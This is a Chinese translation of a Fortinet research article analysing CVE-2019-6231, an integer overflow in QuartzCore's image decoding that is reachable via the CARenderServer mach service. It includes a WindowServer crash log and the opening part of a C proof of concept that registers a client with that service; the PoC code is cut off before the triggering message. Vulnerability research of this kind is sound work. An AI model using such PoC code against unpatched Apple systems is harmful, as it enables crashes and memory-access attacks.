# MacOS/iOS CVE-2019-6231 漏洞深入分析
|
##### 译文声明
本文是翻译文章，文章原作者 fortinet，文章来源：fortinet.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
CVE-2019-6231 漏洞是一个 QuartzCore 框架中处理图像时产生的整数溢出漏洞，具体的位置在
_CA::Render::Image::decode()_ 函数中。
2019年1月22日，苹果发布了 macOS Mojave 10.14.3 以及 iOS 12.1.3，这次更新修复了许多安全漏洞，其中就包括
CVE-2019-6231 漏洞。
18年的12月14日，我曾经在 macOS Mojave 10.14.2 中发现了这个漏洞，并且在21日报告给了苹果。
然而遗憾的是，苹果回应这个问题已经在 macOS Mojave 10.14.3 beta 中被修复了，而这个版本是在12月19日发行的。
接下来，本文将对这个漏洞展开详细的分析。
## 漏洞概览
QuartzCore 是一个 macOS 和 iOS 用来渲染动画场景图形的框架，有时候也被成为 CoreAnimation。
QuartzCore 的渲染模式非常特别，它的图形操作都是运行再一个单独的进程中。
在 macOS 中，这个进程是 WindowServer， 在 iOS 中，这个进程是 backboard 。
QuartzCore 中有个一服务 com.apple.CARenderServer (也被称为 CARenderServer) 可以在 Safari
的沙箱中被访问， 并在 macOS 和 iOS 中都存在。
这个服务中有一个函数 _CA::Render::Image::decode()_ ，用来为 QuartzCore 解析 Image
对象。然而，这个函数在解析 Image 对象时，存在一个整型溢出漏洞。
这个可能会导致一个恶意的应用对受限内存的访问。
以下就是 WindowServer 进程在触发漏洞时的日志。
    Process:               WindowServer [57329]
    Path:                  /System/Library/PrivateFrameworks/SkyLight.framework/Versions/A/Resources/WindowServer
    Identifier:            WindowServer
    Version:               600.00 (337.5)
    Code Type:             X86-64 (Native)
    Parent Process:        launchd [1]
    Responsible:           WindowServer [57329]
    User ID:               88
    Date/Time:             2018-12-14 16:51:08.093 -0800
    OS Version:            Mac OS X 10.14.2 (18C54)
    Report Version:        12
    Anonymous UUID:        0D2EB0AC-26C3-9DBB-CEF0-0060FA5B3A8B
    Sleep/Wake UUID:       7F5E9869-8B81-4B2F-8BBC-54048DE83A26
    Time Awake Since Boot: 15000 seconds
    Time Since Wake:       7000 seconds
    System Integrity Protection: disabled
    Crashed Thread:        2  com.apple.coreanimation.render-server
    Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
    Exception Codes:       KERN_INVALID_ADDRESS at 0x0000008000000018
    Exception Note:        EXC_CORPSE_NOTIFY
    Termination Signal:    Segmentation fault: 11
    Termination Reason:    Namespace SIGNAL, Code 0xb
    Terminating Process:   exc handler [57329]
    External Modification Warnings:
    Thread creation by external task.
    Debugger attached to process.
    VM Regions Near 0x8000000018:
        CoreAnimation          00000001b692e000-00000001bb837000 [ 79.0M] rw-/rw- SM=PRV 
    -->
        STACK GUARD            0000700009f5e000-0000700009f5f000 [    4K] ---/rwx SM=NUL  stack guard for thread 6
    Application Specific Information:
    StartTime:2018-12-14 16:28:00
    GPU:IG
    MetalDevice for accelerator(0x3633): 0x7fd12a62bd58 (MTLDevice: 0x7fd12b035c00)
    IOService:/AppleACPIPlatformExpert/PCI0@0/AppleACPIPCI/IGPU@2/AppleIntelFramebuffer@0
    Thread 0:: Dispatch queue: com.apple.main-thread
    0   libsystem_kernel.dylib           0x00007fff762f717a mach_msg_trap + 10
    1   libsystem_kernel.dylib           0x00007fff762f76d0 mach_msg + 60
    2   com.apple.SkyLight              0x00007fff6f2c95fc run_one_server_pass + 337
    3   com.apple.SkyLight              0x00007fff6f2c9436 CGXRunOneServicesPass + 460
    4   com.apple.SkyLight              0x00007fff6f2ca0bc server_loop + 96
    5   com.apple.SkyLight              0x00007fff6f2ca055 SLXServer + 1149
    6   WindowServer                        0x000000010d30e4d0 0x10d30d000 + 5328
    7   libdyld.dylib                           0x00007fff761bded9 start + 1
    Thread 1:
    0   libsystem_kernel.dylib           0x00007fff762f717a mach_msg_trap + 10
    1   libsystem_kernel.dylib           0x00007fff762f76d0 mach_msg + 60
    2   com.apple.CoreDisplay                          0x00007fff48f09851 0x7fff48e57000 + 731217
    3   com.apple.CoreDisplay                          0x00007fff48f099af 0x7fff48e57000 + 731567
    4   libsystem_pthread.dylib                         0x00007fff763b1305 _pthread_body + 126
    5   libsystem_pthread.dylib                         0x00007fff763b426f _pthread_start + 70
    6   libsystem_pthread.dylib                         0x00007fff763b0415 thread_start + 13
    Thread 2 Crashed:: com.apple.coreanimation.render-server
    0   com.apple.CoreFoundation                   0x00007fff48f45575 CFRetain + 15
    1   com.apple.QuartzCore                           0x00007fff540e674f CA::Render::Decoder::decode_colorspace() + 87
    2   com.apple.QuartzCore                           0x00007fff5411f826 CA::Render::Texture::decode(CA::Render::Decoder*) + 50
    3   com.apple.QuartzCore                           0x00007fff5400a112 CA::Render::Image::decode(CA::Render::Decoder*) + 1104
    4   com.apple.QuartzCore                           0x00007fff540e6d33 CA::Render::Decoder::decode_object(CA::Render::Type) + 1075
    5   com.apple.QuartzCore                           0x00007fff540e6983 CA::Render::Decoder::decode_object(CA::Render::Type) + 131
    6   com.apple.QuartzCore                           0x00007fff5401d858 CA::Render::Layer::Layer(CA::Render::Decoder*) + 116
    7   com.apple.QuartzCore                           0x00007fff540e6daf CA::Render::Decoder::decode_object(CA::Render::Type) + 1199
    8   com.apple.QuartzCore                           0x00007fff540e78a8 CA::Render::decode_commands(CA::Render::Decoder*) + 329
    9   com.apple.QuartzCore                           0x00007fff5409fb10 CA::Render::Server::ReceivedMessage::run_command_stream() + 748
    10  com.apple.QuartzCore                          0x00007fff53f90358 CA::Render::Server::server_thread(void*) + 1968
    11  com.apple.QuartzCore                          0x00007fff53f8fb92 thread_fun(void*) + 25
    12  libsystem_pthread.dylib                        0x00007fff763b1305 _pthread_body + 126
    13  libsystem_pthread.dylib                        0x00007fff763b426f _pthread_start + 70
    14  libsystem_pthread.dylib                        0x00007fff763b0415 thread_start + 13
    Thread 3:…….
    [truncated]
我们可以看到，这个崩溃发生在线程 _com.apple.coreanimation.render-server_ 中， 服务
_com.apple.CARenderServer_ 是在
_/System/Library/Frameworks/QuartzCore.framework/Versions/A/QuartzCore_ 中实现的，
并且通过函数 _CA::Render::Server::register_name(CA::Render::Server_ this, const char
_a2)_ 中注册。
线程 _com.apple.coreanimation.render-server_ 的功能是在函数
_CA::Render::Server::server_thread_ 中实现的。
这个函数主要是用来接收并处理来自客户端的 mach message。
当这个线程接收到一个 _msgh_id_ 为 40002 或者 40003 的 mach message 时，他会调用函数
_CA::Render::Server::ReceivedMessage::run_command_stream(CA::Render::Server::ReceivedMessage_
this)* 来处理接收到的命令序列。
而这个漏洞正是在函数 _CA::Render::Server::ReceivedMessage::run_command_stream_ 中。
## Proof of Concept
接下来，我将利用以下PoC来触发这个漏洞：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct quartz_register_client_s quartz_register_client_t;
    struct quartz_register_client_s {
        mach_msg_header_t header;
        uint32_t body;
        mach_msg_port_descriptor_t ports[4];
        char padding[12];
    };
    typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;
    struct quartzcore_mach_msg{
        mach_msg_header_t header;
        char msg_body[712];
    };
    uint64_t get_filesize(const char *fn){
        struct stat st;
        stat(fn, &st);
        uint64_t fsize = st.st_size;
        return fsize;
    };
    int main(int argc, const char * argv[]) {
        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
        task_get_bootstrap_port(mach_task_self(), &bs_port);
        const char *render_service_name = "com.apple.CARenderServer";
        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, "bootstrap_look_up");
        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &p);
        if (kr != KERN_SUCCESS) {
            return -1;
        }
        printf("[*] Get service of %s successully!n", render_service_name);
        quartz_register_client_t msg_register;
        memset(&msg_register, 0, sizeof(msg_register));
        msg_register.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |
        MACH_MSGH_BITS_COMPLEX;
        msg_register.header.msgh_remote_port = p;
        msg_register.header.msgh_local_port = mig_get_reply_port();
        msg_register.header.msgh_id = 40202;  // _XRegisterClient
        msg_register.body = 4;
        msg_register.ports[0].name = mach_task_self();
        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[1].name = mach_task_self();
        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[2].name = mach_task_self();
        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;
        msg_register.ports[3].name = mach_task_self();
        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;
        kr = mach_msg(&msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,
                      sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),
                      msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            return -1 ;
        }